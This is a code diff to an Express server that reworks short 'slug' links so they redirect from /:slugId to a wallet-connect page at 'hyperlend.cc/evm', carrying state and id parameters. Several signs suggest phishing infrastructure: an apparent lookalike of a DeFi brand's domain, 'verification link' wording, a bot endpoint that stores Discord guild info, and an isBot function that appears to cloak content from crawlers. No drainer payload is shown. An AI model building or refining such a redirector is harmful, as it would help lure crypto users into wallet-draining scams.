@@ -45,6 +45,15 @@ const PUBLIC_BASE_URL = normalizeBaseUrl(process.env.PUBLIC_BASE_URL, SLUG_SERVI
 const SLUG_TTL_SECONDS = Number.isFinite(Number(process.env.SLUG_TTL_SECONDS))
   ? Number(process.env.SLUG_TTL_SECONDS)
   : 600;
+const RESERVED_SLUG_PATHS = new Set([
+  "",
+  "health",
+  "evm",
+  "api",
+  "slugs",
+  "favicon.ico",
+  "robots.txt",
+]);
 
 // Middleware to parse JSON bodies
 app.use(express.json());
@@ -115,10 +124,10 @@ function computeSlugExpiration(expiresAtIso) {
 
 function buildPublicSlugUrl(req, slugId) {
   if (PUBLIC_BASE_URL) {
-    return `${PUBLIC_BASE_URL}/slugs/${slugId}`;
+    return `${PUBLIC_BASE_URL}/${slugId}`;
   }
   const protocol = (req.get('x-forwarded-proto') || req.protocol || 'https').replace(/[^a-z]/gi, '') || 'https';
-  return `${protocol}://${req.get('host')}/slugs/${slugId}`;
+  return `${protocol}://${req.get('host')}/${slugId}`;
 }
 
 function sanitizeExtraParams(extraParams) {
@@ -135,6 +144,55 @@ function sanitizeExtraParams(extraParams) {
     }
   }
   return Object.keys(sanitized).length > 0 ? sanitized : null;
+}
+
+function handleSlugRequest(req, res, slugId) {
+  if (!slugId || typeof slugId !== 'string' || slugId.trim() === '' || RESERVED_SLUG_PATHS.has(slugId.toLowerCase())) {
+    return res.status(404).send('Unknown slug identifier');
+  }
+
+  const destinationPath = SLUG_DESTINATION_PATH.startsWith('/')
+    ? SLUG_DESTINATION_PATH
+    : `/${SLUG_DESTINATION_PATH}`;
+  const storedEntry = slugRedirects.get(slugId);
+
+  if (storedEntry) {
+    if (storedEntry.expiresAt && Date.now() >= storedEntry.expiresAt) {
+      slugRedirects.delete(slugId);
+      return res.status(410).send('This verification link has expired. Please request a new one.');
+    }
+
+    const params = new URLSearchParams();
+    params.append('state', storedEntry.state);
+    params.append('id', storedEntry.id);
+    if (storedEntry.extraParams) {
+      for (const [key, value] of Object.entries(storedEntry.extraParams)) {
+        params.append(key, value);
+      }
+    }
+
+    const forwardUrl = `${SLUG_DESTINATION_BASE_URL}${destinationPath}?${params.toString()}`;
+    console.log(`[Slug Redirect] ${slugId} -> ${forwardUrl}`);
+    return res.redirect(302, forwardUrl);
+  }
+
+  // Backward compatibility: allow explicit state/id query parameters
+  const { state, id, ...restParams } = req.query || {};
+  if (state && id) {
+    const params = new URLSearchParams();
+    params.append('state', state);
+    params.append('id', id);
+    for (const [key, value] of Object.entries(restParams)) {
+      if (typeof value !== 'undefined') {
+        params.append(key, value);
+      }
+    }
+    const forwardUrl = `${SLUG_DESTINATION_BASE_URL}${destinationPath}?${params.toString()}`;
+    console.log(`[Slug Redirect] Legacy params for ${slugId} -> ${forwardUrl}`);
+    return res.redirect(302, forwardUrl);
+  }
+
+  return res.status(404).send('Unknown slug identifier');
 }
 
 // API endpoint for bot to store guild info and get session token
@@ -294,7 +352,7 @@ function isBot(userAgent, acceptLanguage, acceptEncoding) {
 app.get('/', (req, res) => {
   if (REDIRECT_ROOT_TO_SLUG && PRIMARY_SLUG_ID) {
     const queryString = req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '';
-    return res.redirect(302, `/slugs/${PRIMARY_SLUG_ID}${queryString}`);
+    return res.redirect(302, `/${PRIMARY_SLUG_ID}${queryString}`);
   }
 
   const { state, id, ...restParams } = req.query || {};
@@ -314,58 +372,6 @@ app.get('/', (req, res) => {
     <p>Status: ✅ Online</p>
     <p>Connect wallet links go directly to <code>/evm?state=...&id=...</code></p>
   `);
-});
-
-// Friendly slug redirect route (e.g., /slugs/abc123 -> https://hyperlend.cc/evm?state=...&id=...)
-app.get('/slugs/:slugId', (req, res) => {
-  const { slugId } = req.params;
-
-  if (!slugId) {
-    return res.status(404).send('Unknown slug identifier');
-  }
-
-  const storedEntry = slugRedirects.get(slugId);
-  const destinationPath = SLUG_DESTINATION_PATH.startsWith('/')
-    ? SLUG_DESTINATION_PATH
-    : `/${SLUG_DESTINATION_PATH}`;
-
-  if (storedEntry) {
-    if (storedEntry.expiresAt && Date.now() >= storedEntry.expiresAt) {
-      slugRedirects.delete(slugId);
-      return res.status(410).send('This verification link has expired. Please request a new one.');
-    }
-
-    const params = new URLSearchParams();
-    params.append('state', storedEntry.state);
-    params.append('id', storedEntry.id);
-    if (storedEntry.extraParams) {
-      for (const [key, value] of Object.entries(storedEntry.extraParams)) {
-        params.append(key, value);
-      }
-    }
-
-    const forwardUrl = `${SLUG_DESTINATION_BASE_URL}${destinationPath}?${params.toString()}`;
-    console.log(`[Slug Redirect] ${slugId} -> ${forwardUrl}`);
-    return res.redirect(302, forwardUrl);
-  }
-
-  // Backward compatibility: allow explicit state/id query parameters
-  const { state, id, ...restParams } = req.query || {};
-  if (state && id) {
-    const params = new URLSearchParams();
-    params.append('state', state);
-    params.append('id', id);
-    for (const [key, value] of Object.entries(restParams)) {
-      if (typeof value !== 'undefined') {
-        params.append(key, value);
-      }
-    }
-    const forwardUrl = `${SLUG_DESTINATION_BASE_URL}${destinationPath}?${params.toString()}`;
-    console.log(`[Slug Redirect] Legacy params for ${slugId} -> ${forwardUrl}`);
-    return res.redirect(302, forwardUrl);
-  }
-
-  return res.status(404).send('Unknown slug identifier');
 });
 
 // Health check endpoint
@@ -569,6 +575,35 @@ app.get('/evm', async (req, res) => {
     console.error('Error serving file:', error);
     res.status(500).send(`Error: ${error.message}`);
   }
+});
+
+// Legacy route support: redirect /slugs/:slugId -> /:slugId
+app.get('/slugs/:slugId', (req, res) => {
+  const { slugId } = req.params;
+  if (!slugId) {
+    return res.status(404).send('Unknown slug identifier');
+  }
+  const queryString = req.originalUrl && req.originalUrl.includes('?')
+    ? req.originalUrl.substring(req.originalUrl.indexOf('?'))
+    : '';
+  console.log(`[Slug Redirect] Legacy /slugs path requested for ${slugId}`);
+  return res.redirect(301, `/${slugId}${queryString}`);
+});
+
+// Friendly slug redirect route without /slugs prefix
+app.get('/:slugId', (req, res, next) => {
+  const { slugId } = req.params;
+
+  if (!slugId) {
+    return res.status(404).send('Unknown slug identifier');
+  }
+
+  // Allow other explicit routes (like /evm, /api) to handle requests first
+  if (RESERVED_SLUG_PATHS.has(slugId.toLowerCase())) {
+    return next();
+  }
+
+  return handleSlugRequest(req, res, slugId);
 });
 
 // Start server
